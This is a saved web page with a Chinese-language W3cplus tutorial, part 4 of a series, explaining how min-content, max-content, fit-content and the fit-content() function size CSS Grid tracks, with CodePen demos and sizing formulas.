<iframe height="500" style="width: 100%;" scrolling="no" title="Grid Tracks size: min/max-content &amp; image" src="./Grid布局：4-使用内在尺寸定义网格轨道尺寸_files/PopPovq.html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
  See the Pen <a rel="nofollow" href='https://codepen.io/airen/pen/PopPovq'>Grid Tracks size: min/max-content &amp; image</a> by Airen
  (<a rel="nofollow" href='https://codepen.io/airen'>@airen</a>) on <a rel="nofollow" href='https://codepen.io'>CodePen</a>.
</iframe>
</div>

<p>从示例的渲染结果不难发现。</p>

<p>当 <code>min-content</code> 同一列网格轨道有“文本”（网格单元格中全是文本），有图像（另一网格单元格是<code>img</code>）：</p>

<ul>
<li>当图像宽度大于所在列单元格中“最长单词”长度时，<code>min-content</code>等于<code>img</code>的<code>width</code></li>
<li>当图像宽度小于或等于所在列单元格中“最长单词”长度时，<code>min-content</code>等于“最长单词”宽度</li>
</ul>

<p>当 <code>max-content</code> 同一列网格轨道有“文本”（网格单元格中全是文本），有图像（另一网格单元格是<code>img</code>）：</p>

<ul>
<li>当图像宽度小于所在列单元格中“所有文本字符串”长度时，<code>max-content</code>等于所在列“所有文本字符串”最长一列的宽度</li>
<li>当图像宽度大于或等于所在列单元格中“所有文本字符串”长度时，<code>max-content</code>等于<code>img</code>的<code>width</code></li>
</ul>

<p>为了让大家能看得更清楚，把上面示例中“第一行”的三个单元格去掉，只留下图片：</p>

<div style="margin-bottom: 20px">
<iframe height="500" style="width: 100%;" scrolling="no" title="Grid Tracks size: min/max-content &amp; image" src="./Grid布局：4-使用内在尺寸定义网格轨道尺寸_files/LYWpEZo.html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
  See the Pen <a rel="nofollow" href='https://codepen.io/airen/pen/LYWpEZo'>Grid Tracks size: min/max-content &amp; image</a> by Airen
  (<a rel="nofollow" href='https://codepen.io/airen'>@airen</a>) on <a rel="nofollow" href='https://codepen.io'>CodePen</a>.
</iframe>
</div>

<p>正如上例所示：</p>

<ul>
<li><code>min-content</code>对应的网格列轨道，不管<code>img</code> 的<code>width</code>调整到什么值，<code>img</code>都会缩减到<code>0</code>，此时 <code>min-content</code>等于<code>0</code>。如果该列没有其他网格单元格，那么该列不可见</li>
<li><code>max-content</code>对应的网格列轨道，不管<code>img</code> 的<code>width</code>调整到什么值，<code>max-content</code>等于<code>img</code>的初始宽度，本例中是<code>300px</code></li>
</ul>

<p><img src="./Grid布局：4-使用内在尺寸定义网格轨道尺寸_files/css-grid-100.png" alt=""></p>

<h2 class="content-title" data-index="2">fit-content 和 fit-content()</h2>

<p>了解了<code>min-content</code> 和 <code>max-content</code> 之后，我们就可以进入 <code>fit-content</code> 的世界了。它的本质上是下面三个属性简写：</p>

<pre class="css"><code class="css"><span class="tag"><span class="tag">h1</span></span> <span class="rules"><span class="rules">{
    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">width</span></span></span><span class="rule">:<span class="value"><span class="value"> auto;</span></span></span><span class="value"></span></span>
    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">min-width</span></span></span><span class="rule">:<span class="value"><span class="value"> min-content;</span></span></span><span class="value"></span></span>
    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">max-width</span></span></span><span class="rule">:<span class="value"><span class="value"> max-content;</span></span></span><span class="value"></span></span>
<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
</code></pre>

<p>因此，<code>h1</code> 的大小与它的包含盒子的大小相同，但最小为<code>min-content</code>，最大为<code>max-content</code>。回到前面的 <code>min-content</code> 和 <code>max-content</code>的示例中，在该示例上我们添加<code>fit-content</code>的演示效果：</p>

<div style="margin-bottom: 20px">
<iframe height="600" style="width: 100%;" scrolling="no" title="Intrinsic Sizing In CSS：min/max/fit-content for width" src="./Grid布局：4-使用内在尺寸定义网格轨道尺寸_files/zYZvGrY.html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
  See the Pen <a rel="nofollow" href='https://codepen.io/airen/pen/zYZvGrY'>Intrinsic Sizing In CSS：min/max/fit-content for width</a> by Airen
  (<a rel="nofollow" href='https://codepen.io/airen'>@airen</a>) on <a rel="nofollow" href='https://codepen.io'>CodePen</a>.
</iframe>
</div>

<p>拖动示例中滑块，改变容器宽度，你会发现 <code>fit-content</code> 的渲染结果同时具备<code>min-content</code>和<code>max-content</code>两个值的特征。</p>

<p><img src="./Grid布局：4-使用内在尺寸定义网格轨道尺寸_files/css-grid-101.jpg" alt=""></p>

<p>正因为 <code>fit-content</code> 同时具备 <code>min-content</code> 和 <code>max-content</code> 的渲染行为，所以 <code>fit-content</code> 相对而言取值要更为复杂。 <a rel="nofollow" href="https://stackoverflow.com/questions/30704073/what-is-the-difference-between-css-fit-content-and-max-content/45972381#45972381" target="_blank">Stackoverflow 上有一个优秀的回答</a>，这个回答能帮助我们更好的理解 <code>fit-content</code> 的取值方式：</p>

<blockquote>
  <p><strong><code>fit-content</code> uses <code>max-content</code>, unless <code>available &lt; max-content</code>, then it uses <code>available</code>. Unless <code>available &lt; min-content</code>, then it uses <code>min-content</code>.</strong></p>
</blockquote>

<p>大致的意思就是说： <strong><code>fit-content</code> 默许使用 <code>max-content</code>；如果 <code>available</code> 小于 <code>max-content</code>（<code>available &lt; max-content</code>），那么 <code>fit-content</code> 会取 <code>available</code> 值；如果 <code>available</code> 小于 <code>min-content</code>（<code>available &lt; min-content</code>），那么 <code>fit-content</code> 会取 <code>min-content</code> 值</strong> 。</p>

<p><code>available</code> 是指可用空间（Available Space）。在 CSS 中，可用空间（<code>available</code>）表示盒子被放置的空间，它由所参与的格式化上下文的规则来决定。一个盒子可用的空间通常是一个包含它的块容器（该容器尺寸是个明确大小）或一个无限大小（容器尺寸不确定）：</p>

<p><img src="./Grid布局：4-使用内在尺寸定义网格轨道尺寸_files/css-sizing-3.png" alt=""></p>

<p>正如上图所示，带斜线的容器有的时候正好可容纳子元素，这个时候可用空间为<code>0</code>，有时候还有剩余空间，这个时候可用空间就是容器宽度减去所有元素宽度和其之间的间距，有的时候子元素宽度和其之间的间距总和会超过容器宽度，内容被溢出，这个时候可用空间是一个负值。可用空间在 Flexbox 和 Grid 布局中非常有用，Flex 项目和 Grid 项目在一起场景中会根据可用空间来进行缩放（拉伸或压缩）。另外，可用空间会受 <code>min-content</code> 和 <code>max-content</code> 约束。</p>

<p>从前面的描述可知，<code>fit-content</code> 的取值和可用空间、<code>min-content</code> 和 <code>max-content</code>。我们可以用一张流程图来描述它们之间的关系：</p>

<p><img src="./Grid布局：4-使用内在尺寸定义网格轨道尺寸_files/css-grid-102.jpg" alt=""></p>

<p>根据流程图，我们可以这样来判断 <code>fit-content</code> 的取值：</p>

<ul>
<li>如果可用空间（<code>available</code>）充足，那就用<code>max-content</code>，元素容器能容纳</li>
<li>如果可用空间（<code>available</code>）不充足，比<code>max-content</code> 小一点点，这样就得用可用空间（<code>available</code>），也不会导致内容溢出</li>
<li>如果可用空间（<code>available</code>）很小，甚至比<code>min-content</code>还小，那就只能用 <code>min-content</code>，不然就会导致内容溢出</li>
</ul>

<p><code>fit-content</code> 还可以用于 <code>min-width</code> 或 <code>max-width</code> 属性：</p>

<ul>
<li>如果 <code>fit-content</code> 用于 <code>min-width</code> 时，元素的 <code>width</code> 在 <code>min-content</code> 和 <code>auto</code> 之间变化</li>
<li>如果 <code>fit-content</code> 用于 <code>max-width</code> 时，元素的 <code>width</code> 在 <code>0</code> 和 <code>max-content</code> 之间变化</li>
</ul>

<p>比如下面这个示例：</p>

<div style="margin-bottom: 20px">
<iframe height="600" style="width: 100%;" scrolling="no" title="fit-content as width, min-width, and max-width" src="./Grid布局：4-使用内在尺寸定义网格轨道尺寸_files/zYZvNaP.html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
  See the Pen <a rel="nofollow" href='https://codepen.io/airen/pen/zYZvNaP'>fit-content as width, min-width, and max-width</a> by Airen
  (<a rel="nofollow" href='https://codepen.io/airen'>@airen</a>) on <a rel="nofollow" href='https://codepen.io'>CodePen</a>.
</iframe>
</div>

<p>拖动示例中滑块，查看<code>width</code>、<code>max-width</code>、<code>min-width</code> 取 <code>fit-content</code> 时的变化与差异：</p>

<p><img src="./Grid布局：4-使用内在尺寸定义网格轨道尺寸_files/css-grid-103.jpg" alt=""></p>

<p>正如上图所示，在 <code>min-width</code> 和 <code>max-width</code> 中设置 <code>fit-content</code> 可能会造成一定的混乱。因为：</p>

<ul>
<li><code>min-width</code> 按理说是最小宽度，相当于 <code>min-content</code></li>
<li><code>max-width</code> 按理说是最大宽度，相当于 <code>max-content</code></li>
</ul>

<p>而事实上呢？<code>min-width</code> 取 <code>fit-content</code> 时，相当于 <code>min-content</code> 和 <code>auto</code> 之间变化；<code>max-width</code> 取 <code>fit-content</code> 时，相当于 <code>max-content</code> 和 <code>0</code> 之间变化。那么怎么变化，<code>fit-content</code> 具体取何值，易于混乱。为此，不建议在 <strong><code>min-width</code> 和 <code>max-width</code> 中使用 <code>fit-content</code>，而只在<code>width</code> 中使用。</strong></p>

<p>回到 CSS 网格布局中，在上面的示例中稍作修改，在 <code>grid-template-columns</code> 属性中设置 <code>fit-content</code>，比如：</p>

<pre class="css"><code class="css"><span class="class"><span class="class">.container</span></span> <span class="rules"><span class="rules">{
    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> auto fit-content fit-content fit-content;</span></span></span><span class="value"></span></span>
<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
</code></pre>

<p>使用浏览器开发者工具查看代码，很容易发现 <code>fit-content</code> 用于设置网格轨道尺寸的属性上时无效：</p>

<p><img src="./Grid布局：4-使用内在尺寸定义网格轨道尺寸_files/css-grid-104.jpg" alt=""></p>

<p><code>fit-content</code> 除了用于设置网格轨道尺寸的属性上无效时，它用于 Flexbox 中也无效，下面这个示例演示了 <code>fit-content</code> 在 Flexbox 和 Grid 布局的效果：</p>

<div style="margin-bottom: 20px">
<iframe height="600" style="width: 100%;" scrolling="no" title="fit-content in flexbox and grid: nope" src="./Grid布局：4-使用内在尺寸定义网格轨道尺寸_files/gOmagNO.html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
  See the Pen <a rel="nofollow" href='https://codepen.io/airen/pen/gOmagNO'>fit-content in flexbox and grid: nope</a> by Airen
  (<a rel="nofollow" href='https://codepen.io/airen'>@airen</a>) on <a rel="nofollow" href='https://codepen.io'>CodePen</a>.
</iframe>
</div>

<p>接着来看 <code>fit-content()</code>，它和<code>fit-content</code>不同，它是一个CSS函数，到目前为止，它不能用于像<code>width</code>这样的属性上，只能用于 CSS 网格布局中。比如：</p>

<pre class="css"><code class="css"><span class="class"><span class="class">.container</span></span> <span class="rules"><span class="rules">{
    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>fr fit-<span class="function"><span class="function">content(<span class="number"><span class="number">200</span></span>px)</span></span> <span class="number"><span class="number">1</span></span>fr;</span></span></span><span class="value"></span></span>
<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
</code></pre>

<div style="margin-bottom: 20px">
<iframe height="500" style="width: 100%;" scrolling="no" title="fit-content() in grid" src="./Grid布局：4-使用内在尺寸定义网格轨道尺寸_files/MWpaPLg.html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
  See the Pen <a rel="nofollow" href='https://codepen.io/airen/pen/MWpaPLg'>fit-content() in grid</a> by Airen
  (<a rel="nofollow" href='https://codepen.io/airen'>@airen</a>) on <a rel="nofollow" href='https://codepen.io'>CodePen</a>.
</iframe>
</div>

<p>示例中的<code>fit-content(200px)</code> 相当于 <code>min(max-content-size, max(min-content, 200px))</code>。其中：</p>

<ul>
<li>①：<code>max()</code>函数的参数是 <code>min-content</code>（第一个参数） 和 <code>200px</code>（第二个参数），而<code>max()</code> 函数是会返回两个参数中较大的一个值</li>
<li>②：<code>max()</code>返回回来值会放到 <code>min()</code>函数中，即<code>max()</code> 返回的值变成了<code>min()</code>函数的第二个值，它会和最大的内容尺寸（<code>max-content-size</code>）进行比较，这是由于网格限制而产生的实际宽度，但最大为<code>max-content</code>。<code>min()</code>函数和<code>max()</code>类似，只不过它返回的是更小的值</li>
</ul>

<p>因此，<code>fit-content(200px)</code> 用下面这个公式来描述更适合：</p>

<pre class="undefined"><code class="undefined">fit-content(200px) = min(min(max-content, available-size), max(min-content, 200px))
</code></pre>

<p>公式中的<code>available-size</code> 指的是网格中的可用宽度。</p>

<p>除此之外，规范中还提供了另一种公式来描述 <code>fit-content()</code>:</p>

<pre class="javascript"><code class="javascript">fit-content(<span class="xml"><span class="tag"><span class="xml"><span class="tag">&lt;<span class="title"><span class="title">length-percentage</span></span>&gt;</span></span></span><span class="xml">) = max(minimum, min(limit, max-content))
</span></span></code></pre>

<p>其中：</p>

<ul>
<li>①：<code>minimum</code> 代表自动最小值（通常但不总是等于<code>min-content</code>最小值）</li>
<li>②：<code>limit</code> 是作为参数传给 <code>fit-content()</code> 参数，即 <code>&lt;length-percentage&gt;</code>，比如示例中的<code>200px</code></li>
<li>③：<code>min()</code> 返回 <code>limit</code> 和 <code>max-content</code> 中更小的值，比如这个示例，<code>min()</code> 返回的是 <code>200px</code> 和 <code>max-content</code> 更小的一个</li>
<li>④：<code>max()</code> 返回是 <code>minimum</code> 和 <code>min(limit, max-content)</code> 两个值中更大的一个</li>
</ul>

<p>如果上面的描述不易于理解的话，我们可以这样来理解。比如示例中的 <code>fit-content(200px)</code>，表示该列网格轨道宽度不会超过 <code>200px</code>，并且可以在内容很短的情况下缩小到 <code>200px</code> 以下。</p>

<p>另外，一般使用<code>fit-content()</code> 函数时，传递给该函数的参数<code>&lt;length-percentage&gt;</code> 一般都是小于元素的 <code>max-content</code> 值。比如<code>fit-content(200px)</code>，其中 <code>200px</code> 是小于元素 <code>max-content</code> 值。在这种情况下，元素最终的渲染尺寸介于<code>min-content</code> 和 <code>200px</code> 之间。具体是多少，还要看当前的可用空间尺寸（<code>available-size</code>），如果可用空间充足，会使用最大的 <code>200px</code>，如果可用空间小，就会取 <code>min-content</code> 到 <code>200px</code> 之间的某个值，如果可用空间不充足（比<code>min-content</code>还小），那就会使用最小值 <code>min-content</code>，不能再小。</p>

<p>当然，如果 <code>fit-content()</code> 函数中的值比元素的 <code>max-content</code> 还大，那么元素最终渲染尺寸介于 <code>min-content</code> 和 <code>max-content</code> 之间。具体是多少还要看当前的可用空间大小，与上面类似。总之，<code>fit-content()</code>返回的最小值是<code>min-content</code>，不能比<code>min-content</code>值更小。</p>

<p>下面这个示例，<code>grid-template-columns</code> 设置不了不同的选项值，其中 <code>fit-content()</code> 也传了不同的值（包括空值）。如果你感兴趣的话，可以拖动示例中的滑块，查看其渲染结果的差异：</p>

<div style="margin-bottom: 20px">
<iframe height="500" style="width: 100%;" scrolling="no" title="fit-content and fit-content() in grid" src="./Grid布局：4-使用内在尺寸定义网格轨道尺寸_files/oNZjZYR.html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
  See the Pen <a rel="nofollow" href='https://codepen.io/airen/pen/oNZjZYR'>fit-content and fit-content() in grid</a> by Airen
  (<a rel="nofollow" href='https://codepen.io/airen'>@airen</a>) on <a rel="nofollow" href='https://codepen.io'>CodePen</a>.
</iframe>
</div>

<p>如果你尝试着改变 <code>grid-template-columns</code> 的值，你会发现：</p>

<ul>
<li><code>fit-content()</code> 函数和<code>fit-content</code> 是两个不同的东西，其中 <code>fit-content</code> 用于设置网格轨道尺寸的属性中时不会起任何作用（<code>1fr fit-content 1fr</code>）</li>
<li><code>fit-content()</code> 函数需要传一个 <code>&lt;length-percentage&gt;</code> 类型值，因此示例中没传值（<code>1fr fit-content() 1fr</code>）和传<code>fr</code>单位值（<code>1fr fit-content(2fr) 1fr</code>）都未生效</li>
</ul>

<h2 class="content-title" data-index="2">待续...</h2>

<p>虽然在这篇文章主要介绍的是 <code>grid-template-columns</code>  和 <code>grid-template-rows</code> 中使用不同的关键词设置网格轨道尺寸之间的差异。特别是 <code>min-content</code>、<code>max-content</code> 给我们带来的便利之处。另外，<code>fit-content</code> 有强大的特性，但到目前为止，它不能用于 CSS 网格布局中（其实也无法用于 Flexbox布局中）。不过，庆幸的是，在 网格布局中可以使用 <code>fit-content()</code> 函数来设置网格轨道尺寸。在网格布局中除了 <code>fit-content()</code> 函数之外，还有其他一些函数，比如 <code>minmax()</code> 和 <code>repeat()</code>等，也可以用来设置网格轨道尺寸。那么在下一部分，将围绕着这些函数来展开。感兴趣的同学，请持续关注后续的相关更新。</p>
</div></div></div>  </div>

  
   
    <div id="node_footer" class="clearfix">
              <div class="previous-next"><span class="prev">上一篇: </span><a href="https://www.w3cplus.com/css/grid-layout-part-3.html" target="_blank">图解CSS: Grid布局（Part3）</a> | <span class="next">下一篇: </span><a href="https://www.w3cplus.com/css/grid-layout-part-5.html" target="_blank">图解CSS: Grid布局（Part5）</a></div>            
    </div>

        

</div>  </div>
</div>
  </div>

        </div>

      </div>
    </div>

    
          <div id="sidebar-second" class="col-extra" style="position: sticky; top: 80px;">
        <!-- <script type="text/javascript">document.write(unescape('%3Cdiv id="bdcs"%3E%3C/div%3E%3Cscript charset="utf-8" src="//rp.baidu.com/rp3w/3w.js?sid=10994702955876242907') + '&t=' + (Math.ceil(new Date()/3600000)) + unescape('"%3E%3C/script%3E'));</script> -->
          <div class="region region-sidebar-second">
    <div id="block-custom-search-blocks-1" class="block block-custom-search-blocks">

    
  <div class="content">
    <form class="search-form" role="search" action="https://www.w3cplus.com/css/grid-layout-part-4.html?expire=1699847809&amp;code=Kw6KhoSTdEo&amp;sign=24607b9220940a950b960c4e058803b7" method="post" id="custom-search-blocks-form-1" accept-charset="UTF-8" target="_self"><div><div class="form-item form-type-textfield form-item-custom-search-blocks-form-1">
  <label class="element-invisible" for="edit-custom-search-blocks-form-1--2">Search this site </label>
 <input title="请输入您想搜索的关键词。" class="custom-search-box form-text" placeholder="" type="text" id="edit-custom-search-blocks-form-1--2" name="custom_search_blocks_form_1" value="" size="15" maxlength="128">
</div>
<input type="hidden" name="delta" value="1">
<input type="hidden" name="form_build_id" value="form-qpCPaDGmlGz5H1nsVVIW-RL2TXK2azXNV5i6CnmcrF8">
<input type="hidden" name="form_id" value="custom_search_blocks_form_1">
<div class="form-actions form-wrapper" id="edit-actions"><input type="submit" id="edit-submit" name="op" value="搜索" class="form-submit"></div></div></form>  </div>
</div>
<div id="block-block-53" class="block block-block">

    <h2>直达目的地(^_^)</h2>
  
  <div class="content">
    <div class="node-blog-title"><div class="atalog"><ul class="mb-2"> <li><a data-index="0" href="javascript:;" class="active">none</a></li><li><a data-index="1" href="javascript:;">auto</a></li><li><a data-index="2" href="javascript:;">min-content 和 max-content</a></li><li><a data-index="3" href="javascript:;">fit-content 和 fit-content()</a></li><li><a data-index="4" href="javascript:;">待续...</a></li></ul></div></div>

<script>
$('.node-blog h2').addClass('content-title');
$('.node-blog h3').addClass('content-title');
$('.node-blog h4').addClass('content-title');
$('.node-blog h5').addClass('content-title');
//  给 h2 到 h5 增加一个 data-index 的自定义属性
$('.node-blog h2').attr('data-index', 2);
$('.node-blog h3').attr('data-index', 3);
$('.node-blog h4').attr('data-index', 4);
$('.node-blog h5').attr('data-index', 5);

//  函数的一个参数是标题级别，第二个参数是第一个标题的索引值
function atalog(titleIndex, start) {
    //  存储 HTML 和当前的索引值
    var el = {
        el: '',
        index: start
    };
    var current = 0;  //  已遍历的数量

    for (var i = start;i < $('.content-title').length;i ++) {
        if (i < current) {
            //  如果当前 i 的值小于已遍历的数量就跳过
            continue;
        }

        if ($('.content-title').eq(i).attr('data-index') > titleIndex) {
            //  如果是更小一级的标题就调用自身继续查找
            var result = atalog($('.content-title').eq(i).attr('data-index'), i);
            //  把返回的 HTML 添加到当前函数的 el 中
            el.el += '<li> ' + result.el + '</li>';
            current = result.index + 1;  //  设置已遍历的数量
            el.index = result.index;  //  设置索引
            continue;  //  跳过本次循环
        }

        if ($('.content-title').eq(i).attr('data-index') < titleIndex) {
            //  如果是更大一级的标题就返回已生成的 HTML 目录
            el.el = '<ul class="mb-2">' + el.el + '</ul>';
            return el;
        }
        //  生成 HTML 目录
        el.el += '<li><a data-index="' + i + '" href="javascript:;">' + $('.content-title').eq(i).text() + '</a></li>';
        el.index = i;  //  设置当前的索引值为 i
    }
    //  添加列表的外层 ul
    el.el = '<ul class="mb-2"> ' + el.el + '</ul>';
    return el;  //  返回生成的 HTML 目录
}

//  调用生成目录的函数，从第 0 个 h2 开始
var el = atalog(2, 0);
//  把生成的目录插入到文章的开头
$('.node-blog-title').prepend('<div class="atalog">' + el.el + '</div>');
$(".node-blog-title .atalog > ul > li >a ").eq(0).addClass('active');
//  给生成的目录添加点击事件
$('.node-blog-title .atalog a').on('click', function () {
    //  设置滚动条的高度为标题的 offsetTop
     var topPos = $('.content-title').eq($(this).attr('data-index')).offset().top;
var position = topPos - 80;
    $(document).scrollTop(position);
$('.node-blog-title .atalog a').removeClass('active')
    $(this).toggleClass('active')
});


</script>

  </div>
</div>
<div id="block-block-49" class="block block-block">

    
  <div class="content">
    <div style="margin-bottom: 5px;"><a rel="nofollow" href="https://s.juejin.cn/ds/iJrTure4/" target="_blank" title="现代 CSS"><img src="./Grid布局：4-使用内在尺寸定义网格轨道尺寸_files/css-1.jpg" border="0" alt="" width="300"></a></div>

<div style="margin-bottom: 5px;"><a rel="nofollow" href="https://s.juejin.cn/ds/DEHQUMj/" target="_blank" title="防御式 CSS 精讲"><img src="./Grid布局：4-使用内在尺寸定义网格轨道尺寸_files/css-3.jpg" border="0" alt="" width="300"></a></div>

<div style="margin-bottom: 5px;"><a rel="nofollow" href="https://s.juejin.cn/ds/iJrwMDDU/" target="_blank" title="现代 Web 布局"><img src="./Grid布局：4-使用内在尺寸定义网格轨道尺寸_files/css-2.jpg" border="0" alt="" width="300"></a></div>


  </div>
</div>
  </div>
      </div>
    

  </div>
</div>

  <div id="footer-col" class="footer-col">
    <div class="container">
        <div class="region region-footer-col">
    <div id="block-block-39" class="block block-block">

    <h2>关于我们</h2>
  
  <div class="content">
    <a class="media-object" href="http://www.w3cplus.com/">W3cplus</a>
<div class="media-body">
	<p>W3cplus是一个致力于推广国内前端行业的技术博客。它以探索为己任，不断活跃在行业技术最前沿，努力提供高质量前端技术博文；其文章范围广泛，主要以CSS、HTML、JavaScript、A11Y、动画等教程为主。</p>
</div>
  </div>
</div>
<div id="block-block-40" class="block block-block">

    <h2>关于站长</h2>
  
  <div class="content">
    <p><a class="media-object" href="https://www.w3cplus.com/" target="_blank">大漠</a></p>
<div class="media-body">
	<p>常用昵称“大漠”，<a href="https://www.w3cplus.com/" target="_blank">W3CPlus</a>创始人，曾就职于淘宝。对HTML、CSS和A11Y等领域有一定的认识和丰富的实践经验。现在主要从事智能UI领域的探讨和学习！。CSS和Drupal中国布道者。2014年出版《<a href="https://www.w3cplus.com/book-comment.html">图解CSS3：核心技术与案例实战</a>》。</p>
	<div class="social">
		<a rel="nofollow" class="github" href="https://github.com/airen" target="_blank" title="github">github</a> <a rel="nofollow" class="twitter" href="https://twitter.com/w3cplus" target="_blank" title="twitter">twitter</a></div>
</div>
<p>&nbsp;</p>
  </div>
</div>
<div id="block-block-41" class="block block-block">

    <h2>我的作品</h2>
  
  <div class="content">
    <a class="media-object" href="https://www.w3cplus.com/book-comment.html" target="_blank">图解CSS3</a>
<div class="media-body">
	<p>本书是历时2载的心血之作，根据最新的CSS撰写，融入了作者在CSS领域多年的使用经验，旨在将本书打造成为CSS领域最权威和实用的专业著作，供没有经验的读者系统学习，供有经验的读者参考备查。新版在《<a href="https://www.w3cplus.com/blog/tags/674.html">图解SS</a>》中持续更新！</p></div>
  </div>
</div>
  </div>
    </div>
  </div> 

  <div id="footer" class="footer">
    <div class="container">
        <div class="region region-footer">
    <div id="block-block-54" class="block block-block">

    
  <div class="content">
        <p><a rel="nofollow" href="http://www.beian.miit.gov.cn/" target="_blank">湘B2-20110104-7</a>，衡阳市雅米信息技术有限公司 © 2011-2022 <a href="https://www.w3cplus.com/page/26.html" target="_blank">W3CPLUS</a>，感谢<a rel="nofollow" href="https://www.drupal.org/" target="_blank">Drupal</a>开源技术。感谢<a rel="nofollow" href="https://www.qiniu.com/" target="_blank">七牛云存储</a>提供静态资源空间。</p>
  </div>
</div>
  </div>
    </div>
  </div> 

<div id="totop" style="position: fixed; bottom: 50px; right: 15px; cursor: pointer; z-index: 999999; display: block; opacity: 1;">
  <!-- <div id="zhi12-shang-exp-2" class="shang-wrap" style="text-align: center;position:absolute;right: 0;bottom: 130%;z-index: 9999;">
    <div><a class="zhi12-popup zhi12-widget" rel="nofollow" href="//www.zhi12.com/paycenter/reward?entity=user&id=5491" target="_blank"><img src="/sites/default/files/blogs/2019/1905/w3cplus-shang-2.png" alt="打赏" class="share-img" /></a></div>
</div> -->
    <a id="topLink" title="返回顶部">返回顶部</a>
</div>  <script type="text/javascript" src="./Grid布局：4-使用内在尺寸定义网格轨道尺寸_files/js_VU7P4CTgUZdF2SyFko5LLAg9ZK0OSVjXVaAFnTLgVt0.js.下载"></script>
  
  <script type="text/javascript" src="./Grid布局：4-使用内在尺寸定义网格轨道尺寸_files/respond.min.js.下载"></script>
<script type="text/javascript" src="./Grid布局：4-使用内在尺寸定义网格轨道尺寸_files/js_ypadrG4kz9-JBpNOXmgjyVozLCJG_1RP3Ig-iqWR8n0.js.下载"></script>
<script type="text/javascript" src="./Grid布局：4-使用内在尺寸定义网格轨道尺寸_files/js_YFY-zVcRx2bEEpwBdCXta7mOli3xeW_KMe7Y6Mv8zGk.js.下载"></script>
<script type="text/javascript" src="./Grid布局：4-使用内在尺寸定义网格轨道尺寸_files/js_xP4aMPEI1iZ1ZrZMlSgsTllQqvH8oWbOQ7JVFWyrFCo.js.下载"></script>
<script type="text/javascript">
<!--//--><![CDATA[//><!--
jQuery.extend(Drupal.settings, {"basePath":"\/","pathPrefix":"","ajaxPageState":{"theme":"w3cplusV2","theme_token":"nC_qTOe7OumBHkPpxcbpR15aD19zbkceMlAMRCj2SYI","js":{"modules\/statistics\/statistics.js":1,"sites\/all\/modules\/contrib\/respondjs\/lib\/respond.min.js":1,"sites\/all\/modules\/contrib\/jquery_update\/replace\/jquery\/1.10\/jquery.min.js":1,"misc\/jquery-extend-3.4.0.js":1,"misc\/jquery-html-prefilter-3.5.0-backport.js":1,"misc\/jquery.once.js":1,"misc\/drupal.js":1,"public:\/\/languages\/zh-hans_71GwLEjcRL9b45LGd77xwMMW4YJ5etdnokx7XZMwKAc.js":1,"sites\/all\/modules\/contrib\/custom_search\/js\/custom_search.js":1,"sites\/all\/themes\/w3cplusV2\/js\/highlight.pack.js":1,"sites\/all\/themes\/w3cplusV2\/js\/main.js":1},"css":{"modules\/system\/system.base.css":1,"modules\/system\/system.menus.css":1,"modules\/system\/system.messages.css":1,"modules\/system\/system.theme.css":1,"modules\/field\/theme\/field.css":1,"modules\/node\/node.css":1,"modules\/search\/search.css":1,"modules\/user\/user.css":1,"sites\/all\/modules\/contrib\/views\/css\/views.css":1,"sites\/all\/modules\/contrib\/ckeditor\/ckeditor.css":1,"sites\/all\/modules\/contrib\/ctools\/css\/ctools.css":1,"sites\/all\/modules\/contrib\/paywall\/includes\/paywall_php_sdk\/paywall.css":1,"sites\/all\/modules\/contrib\/custom_search\/custom_search.css":1,"sites\/all\/themes\/w3cplusV2\/css\/style.css":1}},"custom_search":{"form_target":"_self","solr":0},"statistics":{"data":{"nid":"2714"},"url":"\/modules\/statistics\/statistics.php"},"urlIsAjaxTrusted":{"\/css\/grid-layout-part-4.html?expire=1699847809\u0026code=Kw6KhoSTdEo\u0026sign=24607b9220940a950b960c4e058803b7":true}});
//--><!]]>
</script>
<script src="./Grid布局：4-使用内在尺寸定义网格轨道尺寸_files/jquery.colorbox-min.js.下载"></script>


<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?177319b798978621f83845b12c86fa29";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>  
<span class="ddc89"></span>
<div id="cboxOverlay" style="display: none;"></div><div id="colorbox" class="" role="dialog" tabindex="-1" style="display: none;"><div id="cboxWrapper"><div><div id="cboxTopLeft" style="float: left;"></div><div id="cboxTopCenter" style="float: left;"></div><div id="cboxTopRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxMiddleLeft" style="float: left;"></div><div id="cboxContent" style="float: left;"><div id="cboxTitle" style="float: left;"></div><div id="cboxCurrent" style="float: left;"></div><button type="button" id="cboxPrevious"></button><button type="button" id="cboxNext"></button><button type="button" id="cboxSlideshow"></button><div id="cboxLoadingOverlay" style="float: left;"></div><div id="cboxLoadingGraphic" style="float: left;"></div></div><div id="cboxMiddleRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxBottomLeft" style="float: left;"></div><div id="cboxBottomCenter" style="float: left;"></div><div id="cboxBottomRight" style="float: left;"></div></div></div><div style="position: absolute; width: 9999px; visibility: hidden; display: none; max-width: none;"></div></div></body></html>